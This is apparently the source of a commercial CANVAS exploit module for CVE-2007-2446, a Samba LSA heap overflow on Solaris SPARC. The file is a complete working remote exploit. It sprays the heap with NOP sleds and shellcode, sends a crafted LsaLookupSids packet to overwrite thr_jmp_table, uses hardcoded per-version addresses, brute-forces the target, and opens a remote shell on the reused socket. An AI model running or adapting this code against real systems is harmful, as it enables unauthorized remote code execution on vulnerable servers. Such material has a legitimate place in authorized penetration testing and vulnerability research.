#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2007
#http://www.immunityinc.com/CANVAS/ for more information

#Part of CANVAS For licensing information, please refer to your
#Immunity CANVAS licensing documentation

import sys

if "." not in sys.path:
    sys.path.append(".")

from exploitutils import *
from tcpexploit import tcpexploit
import solarisMosdefShellServer
from solarisNode import solarisNode
import libs.newsmb.libdcerpc as libdcerpc

# GUI info
VERSION="1.0"
NAME="SAMBA api_lsa_lookup_sids"
DESCRIPTION="SAMBA api_lsa_lookup_sids Heap Overflow"
DOCUMENTATION={}
DOCUMENTATION['VENDOR']="Sun and Samba"
DOCUMENTATION["Date public"] = "5/15/2007"
DOCUMENTATION["CVE Name"] = "CVE-2007-2446"
DOCUMENTATION["CVE Url"] = "http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-2446"
DOCUMENTATION['CVSS'] = 10.0
DOCUMENTATION["Platforms Tested"] = "Solaris 9 with default SAMBA 2.2.8a, Solaris 8 with sunfreeware SAMBA 3.0.10"

PROPERTY = {}
PROPERTY["TYPE"]= "Exploit"
PROPERTY["SITE"]=  "Remote"
PROPERTY["ARCH"]= [ ["Solaris", "sparc"] ]
PROPERTY["VERSION"]= ["8", "9", "10"] 

NOTES="""

High covertness breaks this exploit, due to fragging messing with our heap spamming.

a sol10:

FF3B0000     176K r-x--  /lib/ld.so.1

[562]   |0x0003c238|0x0000001c|OBJT |LOCL |0    |15 |thr_jmp_table

a sol9:

FF3C0000     152K r-x--  /usr/lib/ld.so.1

[482]   |0x000361ec|0x0000001c|OBJT |LOCL |0    |15

a sol9:

FF3C0000     160K r-x--  /usr/lib/ld.so.1

[497]   |0x000381e8|0x0000001c|OBJT |LOCL |0    |15     |thr_jmp_table


#(gdb) x/2i$pc
#0xff1c389c <t_delete+52>:       st  %o0, [ %o1 + 8 ]
#0xff1c38a0 <t_delete+56>:       st  %o1, [ %o0 + 0x20 ]
#(gdb) i r o0 o1
#o0             0x49490000       1229520896
#o1             0x41414141       1094795585
#(gdb)


# FF3C0000     160K r-x--  /usr/lib/ld.so.1 <-- ld.so.1 base (pmap) 

# /usr/ccs/bin/nm -x /usr/lib/ld.so.1 | grep thr_jmp_table
# [497]   |0x000381e8|0x0000001c|OBJT |LOCL |0    |15     |thr_jmp_table

#(gdb) p/x 0xFF3C0000 + 0x000381e8
#$2 = 0xff3f81e8 <-- thr_jmp_table
#(gdb)  

(msrpc.py OLDSAMBA may need to be set for old versions that do not support
Unicode)

"""


# info, ld.so.1 base, thr_jmp_table offset list 
targets = {
    0 : ["Autoversioning N/A",  0, 0],
    1 : ["Solaris  8 (SPARC)", 0xFF3B0000L, [0x321b4, 0x361d8, 0x361e0, 0x37298, 0x381e8]], 
    2 : ["Solaris  9 (SPARC)", 0xFF3C0000L, [0x000381e8, 0x000361ec]],
    3 : ["Solaris 10 (SPARC)", 0xFF3B0000L, [0x0003c238]]
}


class theexploit(tcpexploit):
    def __init__(self):
        tcpexploit.__init__(self)
        self.name = NAME
        self.covertness = 0
        self.port = 0
        self.host = ""
        self.version = 0
        self.myDCE = None
        self.connectionList=[] #none to start, fill this in with buildConnectionList()
        return

    def createShellcode(self):
        from shellcode import solarisSPARCshellcodeGenerator
        sc = solarisSPARCshellcodeGenerator.solarisSparc()
        sc.addAttr("GOFindSock", None)
        self.shellcode = sc.get()

    def neededListenerTypes(self):
        return []
    
    def test(self):
        self.host=self.target.interface
        self.port=int(self.argsDict.get("port",self.port))
        if self.connect():
            self.port = self.myDCE.dcerpc_connection.port
            self.testOS()
            return 1

        self.log('Test failed')
        return 0

    def testOS(self):
        return 1

    def connect(self):
        # connect DCE pipe
        res = None        
        connectionList =  self.buildConnectionList()
        
        auth_type = libdcerpc.RPC_C_AUTHN_NONE if self.covertness < 2 else libdcerpc.RPC_C_AUTHN_WINNT
        auth_level = libdcerpc.RPC_C_AUTHN_LEVEL_DEFAULT if self.covertness < 2 else libdcerpc.RPC_C_AUTHN_LEVEL_PKT_PRIVACY

        if self.covertness >= 2:
            self.log("DCERPC crypto enabled, set covertness to 1 and try again if exploit fails!")

        frag_level = None
        if self.covertness >= 5 and self.covertness < 11:
            self.log('Crypto + moderate SMB fragmentation')
            frag_level = 1
        elif self.covertness == 11:
            self.log('Crypto + MAX fragmentation')
            frag_level = 2

        for binding in connectionList:
            try:
                self.myDCE = libdcerpc.DCERPC(binding, getsock=self, frag_level=frag_level)
                res = self.myDCE.bind(self.UUID, self.uuidversion, auth_type=auth_type, auth_level=auth_level)
                if res:
                    break
            except libdcerpc.DCERPCException, ex:
                self.log('DCERPC Error: %s' % ex)

        if not res:
            return 0

        self.log("Initiating attack")
        return 1

    def write4(self, what, where, shift=0):
        try:
            self.setProgress(25)
            self.connect()
            # spam heap
            self.SpamHeap(shift)

            print "[!] Using highword 'what': 0x%.4x and thr_jmp_table: 0x%.8x" % (what, where)
            self.LsaLookupSids(5, 5 + 4,  where - 8, what)
            self.setProgress(75)

            # trigger, sleep, and check
            sck = self.myDCE.dcerpc_connection.s
            sck.send("\x00\x00\x00\x00")
            time.sleep(0.5)

            buf = sck.recv(1000)
            if buf.find("G") != -1:
                sck.send("O")
                node = solarisNode()
                node.parentnode = self.socknode
                solarisMosdefShellServer.solarisshellserver(sck, node, logfunction = self.logfunction)
                node.startup()
                self.setInfo("%s attacking %s:%d (succeeded)"%(NAME,self.host,self.port), showlog=False)
                return node

        except Exception, msg:
            print "[!] Exception! (%s)" % msg
            
            import traceback
            traceback.print_exc(file=sys.stdout)

        return 0                       

    
    def run(self):
        self.host=self.target.interface
        self.port=int(self.argsDict.get("port",self.port))
        self.version = int(self.argsDict.get("version",self.version))

        self.setInfo("%s attacking %s:%d - (in progress)"% (self.name, self.host, self.port), showlog=True)

        self.socknode = self.argsDict["passednodes"][0]
        if self.version==0:
            self.log("Autoversioning not supported yet...")
            return 0
        info, ldbase, thr_jmp_list = targets[self.version]
        for offset in thr_jmp_list:
            # what 0x00150000 -- 0x00300000 (0x00010000 steps) tries per offset, 2 per write 4
            print "[!] Trying jmp_thr_table offset: 0x%.5x"%offset
            # heap segment brute (we spam a > 0xffff section with shellcode, so we're ensured a 0xffff0000 seg.)
            # we have highword control, so 0x0015 --> 0x00150000
            what = 0x0023
            while what != 0x0031:
                # we try 4 times per addy, 2 times regular, 2 times shift
                shell = self.write4(what, ldbase + offset)
                if shell not in [0, 1, None]:
                    print "[!] OWNED :D"
                    return shell
                shell = self.write4(what, ldbase + offset)
                if shell not in [0, 1, None]:
                    print "[!] OWNED :D"
                    return shell
                shell = self.write4(what, ldbase + offset, shift=1)
                if shell not in [0, 1, None]:
                    print "[!] OWNED :D"
                    return shell
                shell = self.write4(what, ldbase + offset, shift=1)
                if shell not in [0, 1, None]:
                    print "[!] OWNED :D"
                    return shell
                what += 0x0001
                         
        self.setInfo("%s attacking %s:%d (failed)"%(self.name,self.host,self.port), showlog=True)
        return 0
    
    def buildConnectionList(self):
        """
        Specify endpoints for the attack
        """
        self.UUID = "12345778-1234-abcd-ef00-0123456789ab"
        self.uuidversion = "0.0"
        self.connectionList = ["ncacn_np:%s[\\lsarpc]"% (self.host)]
        return self.connectionList
    

    def SpamHeap(self, shift=0):
        pkt = ""
        # shift and try (branch/xor nops)
        if shift:
            pkt += "\x01\x00\x00\x00"
        # aboot 20000 nops + shellcode
        # noir style branch/xor nops
        pkt += "\xa4\x1c\x40\x11\x20\xbf\xff\xff" * 10000
        pkt += "\x01\x00\x00\x00" # anulled delayslot nop
        pkt += self.shellcode
        self.myDCE.dcerpc_connection.s.set_timeout(10*60)
        self.myDCE.call(0x10, pkt, response=True)
        return ""

    def LsaLookupSids(self, num_structs_alloc, num_structs, where, what):
        pkt = ""
        pkt += "\x01"*20 #handle     
        #PSID_ARRAY
        pkt += struct.pack("<L", 1) #num_entries
        pkt += struct.pack("<L", 0x4321) #ptr_sid_enum
        pkt += struct.pack("<L", 1) #num_entries2
        pkt += struct.pack("<L", 0x4321) #*ptr_sid
        #SID2
        pkt += struct.pack("<L", 0x1) #num_auths
        #SID
        pkt +=  struct.pack("<B", 0x1)
        pkt +=  struct.pack("<B", 0x1)
        pkt += "\x01"*6
        pkt += struct.pack("<L", 0x12345678)
        #LSA_TRANS_NAME_ENUM
        pkt += struct.pack("<L", num_structs_alloc) #num_entries         (num_structs_alloc * (sizeof(LSA_TRANS_NAME)=0x10)) bytes to alloc
        pkt += struct.pack("<L", 0x88888888L)       #ptr_trans_names
        pkt += struct.pack("<L", num_structs)       #num_entries2         number of structs to read from packet
        #LSA_TRANS_NAME
        lsatname = ""
        lsatname += struct.pack("<H", 0x4141) #sid_name_use, to survive t_delete 0x290000 
        lsatname += struct.pack("<H", 0x0000) #padding (gets nulled out)
        #UNIHDR
        lsatname += struct.pack("<H", 0x4242) #uni_str_len
        lsatname += struct.pack("<H", 0x4242) #uni_str_max_len
        lsatname += struct.pack("<L", 0x41414110) #buffer (KEEP LAST BIT UNSET)
        lsatname += struct.pack("<L", 0x43434300) #domain_idx 
        pkt += lsatname*num_structs_alloc # these are just filler

        # filler till tree struct
        lsatname_ovf  = struct.pack("<H", 0x0000) # 1 becomes highword
        lsatname_ovf += struct.pack("<H", 0x0000) # 1 nulled out
        lsatname_ovf += struct.pack("<H", 0x4242) # 2 highword
        lsatname_ovf += struct.pack("<H", 0x4242) # 2 lowword
        lsatname_ovf += struct.pack("<L", 0x41414140) # 3
        lsatname_ovf += struct.pack("<L", 0x44444440) # 4
        lsatname_ovf += struct.pack("<H", 0x4545) # 5 becomes highword
        lsatname_ovf += struct.pack("<H", 0x0000) # 5 nulled out
        lsatname_ovf += struct.pack("<H", 0x4646) # 6 highword
        lsatname_ovf += struct.pack("<H", 0x4640) # 6 lowword

        # this is the actual tree structure 
 
        # we can have 0's, but what the hell :)
        lsatname_ovf += struct.pack("<L", 0xfffffff8L) # 7
        lsatname_ovf += struct.pack("<L", 0x41414141) # 8

        # tp (o0)
        lsatname_ovf += struct.pack("<H", what) # 9 becomes highword
        lsatname_ovf += struct.pack("<H", 0x4141) # 9 nulled out

        lsatname_ovf += struct.pack("<H", 0x4141) # 10 highword
        lsatname_ovf += struct.pack("<H", 0x4141) # 10 lowword
        lsatname_ovf += struct.pack("<L", 0xffffffffL) # 11
        lsatname_ovf += struct.pack("<L", 0x41414141) # 12
        lsatname_ovf += struct.pack("<H", 0x4141) # 9 becomes highword
        lsatname_ovf += struct.pack("<H", 0x4141) # 9 nulled out
        lsatname_ovf += struct.pack("<H", 0x4141) # 10 highword
        lsatname_ovf += struct.pack("<H", 0x4141) # 10 lowword
        # sp (o1)
        lsatname_ovf += struct.pack("<L", where) # 11
        lsatname_ovf += struct.pack("<L", 0x41414141) # 12
        # 12 more bytes filler, but we dont care :)

        pkt += lsatname_ovf        
        
        self.myDCE.dcerpc_connection.s.set_timeout(10*60)
        
        self.log("LsaLookupSids")
        self.myDCE.call(0x0f, pkt, response=True)
        return ""
    
    def displayVersions(self):
        i = 0
        for listline in targets.values():
            print "%d : %s"% (i, listline[0])
            i = i + 1
        sys.exit(0)
    
if __name__== '__main__':
    app = theexploit()
    app.options = ["This exploit recycles the socket :), no connectback needed"]
    ret = standard_callback_commandline(app)
    if ret not in [0, 1, None]:
        ret.interact()
